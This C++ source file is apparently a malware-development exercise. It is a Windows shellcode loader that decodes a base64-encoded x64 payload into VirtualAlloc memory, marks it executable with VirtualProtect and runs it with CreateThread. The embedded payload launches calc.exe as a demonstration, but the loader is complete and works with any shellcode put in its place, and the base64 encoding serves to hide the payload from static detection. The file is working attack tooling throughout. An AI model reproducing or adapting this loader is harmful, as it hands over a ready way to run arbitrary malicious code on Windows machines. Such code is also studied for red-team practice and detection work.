#include <Windows.h>
#include <iostream>
#include <cstdlib>
#include <cstring>
#include <Wincrypt.h>

#pragma comment(lib, "crypt32.lib")

unsigned char calc_payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
unsigned int calc_len = sizeof(calc_payload);

// Decode payload from B64. Returns int if wanted, but changing it to void also works if ur not going to use it.
int decodeBase64(const BYTE* src, unsigned int srcLen, char* dst, unsigned int dstLen) {
    DWORD outLen;
    BOOL fRet;

    outLen = dstLen;
    fRet = CryptStringToBinary((LPCSTR)src, srcLen, CRYPT_STRING_BASE64, reinterpret_cast<BYTE *>(dst), &outLen, NULL, NULL);
    if (!fRet) outLen = 0;

    return(outLen);
};

int main() {
    void* exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect;

    exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    std::cout << "payload address: " << static_cast<void*>(calc_payload) << std::endl;
    std::cout << "payload address: " << static_cast<void*>(exec_mem) << std::endl;

    std::cout << "Press enter to execute payload!\n";
    std::cin.get();

    decodeBase64((const BYTE*)calc_payload, calc_len, static_cast<char *>(exec_mem), calc_len);

    rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READWRITE, &oldprotect);

    std::cout << "Payload decrypted!\n";
    std::cin.get();

    if (rv != 0) {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        WaitForSingleObject(th, INFINITE);
    } else {
        std::cout << "Failed to create thread. rv (return value) is 0!\n";
    }

    std::cin.get();
}
